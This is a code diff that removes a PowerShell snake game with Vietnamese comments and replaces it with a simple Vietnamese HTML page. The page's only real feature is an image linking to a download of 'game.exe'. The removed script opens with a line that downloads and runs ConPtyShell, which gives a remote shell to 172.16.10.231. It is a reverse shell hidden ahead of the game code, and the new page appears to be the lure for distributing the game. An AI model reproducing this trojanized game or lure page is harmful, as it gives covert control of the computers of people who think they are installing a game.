@@ -1,112 +1,99 @@
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell  172.16.10.231 2001
-
-
-# ================== SETUP ==================
-$width  = 40
-$height = 20
-$delay  = 120   # ms – giảm để rắn chạy nhanh hơn
-
-[Console]::CursorVisible = $false
-[Console]::Clear()
-
-# ================== INIT ==================
-$snake = @(
-    @{x = [int]($width / 2); y = [int]($height / 2)}
-)
-
-$dir = "Right"
-$food = @{
-    x = Get-Random -Minimum 1 -Maximum ($width - 2)
-    y = Get-Random -Minimum 1 -Maximum ($height - 2)
-}
-
-$gameOver = $false
-
-# ================== DRAW ==================
-function Draw {
-    [Console]::SetCursorPosition(0,0)
-
-    for ($y = 0; $y -le $height; $y++) {
-        for ($x = 0; $x -le $width; $x++) {
-
-            if ($x -eq 0 -or $x -eq $width -or $y -eq 0 -or $y -eq $height) {
-                Write-Host "#" -NoNewline
-            }
-            elseif ($snake | Where-Object { $_.x -eq $x -and $_.y -eq $y }) {
-                Write-Host "O" -NoNewline
-            }
-            elseif ($food.x -eq $x -and $food.y -eq $y) {
-                Write-Host "@" -NoNewline
-            }
-            else {
-                Write-Host " " -NoNewline
-            }
-        }
-        Write-Host ""
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>Website Đơn Giản</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: #f4f6f8;
+      color: #333;
     }
-
-    Write-Host "WASD để di chuyển | Ctrl + C để thoát"
-}
-
-# ================== INPUT ==================
-function Read-Key {
-    if ([Console]::KeyAvailable) {
-        $key = [Console]::ReadKey($true).Key
-        switch ($key) {
-            "W" { if ($dir -ne "Down")  { $dir = "Up"    } }
-            "S" { if ($dir -ne "Up")    { $dir = "Down"  } }
-            "A" { if ($dir -ne "Right") { $dir = "Left"  } }
-            "D" { if ($dir -ne "Left")  { $dir = "Right" } }
-        }
+    header {
+      background: #1f2937;
+      color: white;
+      padding: 16px 24px;
     }
-}
-
-# ================== GAME LOOP ==================
-try {
-    while (-not $gameOver) {
-
-        Read-Key
-
-        $head = $snake[0].Clone()
-
-        switch ($dir) {
-            "Up"    { $head.y-- }
-            "Down"  { $head.y++ }
-            "Left"  { $head.x-- }
-            "Right" { $head.x++ }
-        }
-
-        # Đụng tường
-        if ($head.x -le 0 -or $head.x -ge $width -or
-            $head.y -le 0 -or $head.y -ge $height) {
-            $gameOver = $true
-            break
-        }
-
-        # Đụng thân
-        if ($snake | Where-Object { $_.x -eq $head.x -and $_.y -eq $head.y }) {
-            $gameOver = $true
-            break
-        }
-
-        $snake.Insert(0, $head)
-
-        # Ăn mồi
-        if ($head.x -eq $food.x -and $head.y -eq $food.y) {
-            $food.x = Get-Random -Minimum 1 -Maximum ($width - 2)
-            $food.y = Get-Random -Minimum 1 -Maximum ($height - 2)
-        }
-        else {
-            $snake.RemoveAt($snake.Count - 1)
-        }
-
-        Draw
-        Start-Sleep -Milliseconds $delay
+    header h1 {
+      margin: 0;
+      font-size: 24px;
     }
-}
-finally {
-    [Console]::Clear()
-    Write-Host "💀 GAME OVER"
-    Write-Host "Chiều dài rắn: $($snake.Count)"
-    Read-Host "Nhấn Enter để thoát"
-}
+    nav a {
+      color: #cbd5e1;
+      margin-right: 16px;
+      text-decoration: none;
+    }
+    nav a:hover {
+      color: white;
+    }
+    main {
+      padding: 24px;
+      max-width: 900px;
+      margin: auto;
+    }
+    .card {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+      margin-bottom: 20px;
+    }
+    footer {
+      text-align: center;
+      padding: 16px;
+      background: #e5e7eb;
+      font-size: 14px;
+    }
+    button {
+      background: #2563eb;
+      color: white;
+      border: none;
+      padding: 10px 16px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #1d4ed8;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>Website Đơn Giản</h1>
+  <nav>
+    <a href="#home">Trang chủ</a>
+    <a href="#about">Giới thiệu</a>
+    <a href="#contact">Liên hệ</a>
+  </nav>
+</header>
+
+<main>
+  <div class="card" id="home">
+    <h2>Chào mừng 👋</h2>
+    <p>Đây là một website HTML đơn giản, không cần đăng nhập, không backend.</p>
+    <button onclick="alert('Bấm vào ảnh để tải game')">Bấm thử</button>
+  </div>
+  <a href="files/game.exe" download>
+    <img src="images/snake.png" alt="Snake game">
+  </a>
+  <div class="card" id="about">
+    <h2>Giới thiệu</h2>
+    <p>Website này chỉ dùng <b>HTML</b>, demo.</p>
+  </div>
+
+  <div class="card" id="contact">
+    <h2>Liên hệ</h2>
+    <p>Email: example@email.com</p>
+    <p>Facebook: facebook.com/example</p>
+  </div>
+</main>
+
+<footer>
+  © 2026 - Website đơn giản
+</footer>
+
+</body>
+</html>
